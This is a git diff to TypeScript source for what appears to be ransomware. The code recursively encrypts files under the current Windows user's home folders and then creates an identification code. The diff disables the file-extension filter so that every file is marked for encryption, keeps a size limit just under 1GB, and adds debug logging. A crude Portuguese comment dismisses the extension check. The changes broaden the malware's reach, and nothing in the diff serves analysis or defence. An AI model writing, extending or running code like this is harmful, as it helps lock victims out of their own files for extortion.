@@ -8,7 +8,6 @@ const encrypt = () => {
   const userName: string = os.userInfo().username;
   console.log(userName);
   const userDir: string = `C:\\Users\\${userName}`;
- // const userDir: string = `C:\\Users\\LEONARDO\\encriptar`;
 
   console.log('Starting...\n');
 
@@ -19,9 +18,10 @@ const encrypt = () => {
   console.log('Encrypted Files :');
 
   // encrypt files recursively
-  for (let i = 0; i < config.targetFolder.length; i++)
+  for (let i = 0; i < config.targetFolder.length; i++) {
+    console.log(i, config.targetFolder[i]);
     encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
-
+  }
   console.log('\nEncryption Finished!\n');
 
   // create identification code
@@ -59,18 +59,19 @@ const encryptDir = (dir: string, key: string, iv: Buffer) => {
       } else {
         // if file
 
-        let isTarget: boolean = false;
+        let isTarget: boolean = true;
 
+        // FODA SE EXTENSÃO
         // check extension
-        for (let j = 0; j < config.targetExtension.length; j++) {
-          if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
-            isTarget = true;
-            break;
-          }
-        }
+        // for (let j = 0; j < config.targetExtension.length; j++) {
+        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
+        //     console.log(j);
+        //     isTarget = true;
+        //     break;
+        //   }
+        // }
 
         if (isTarget) {
-          // check file size (only under 1GB)
           let fileStat = fs.statSync(fullPath);
           let fileSize = fileStat['size'];
           if (fileSize < 1e9) {
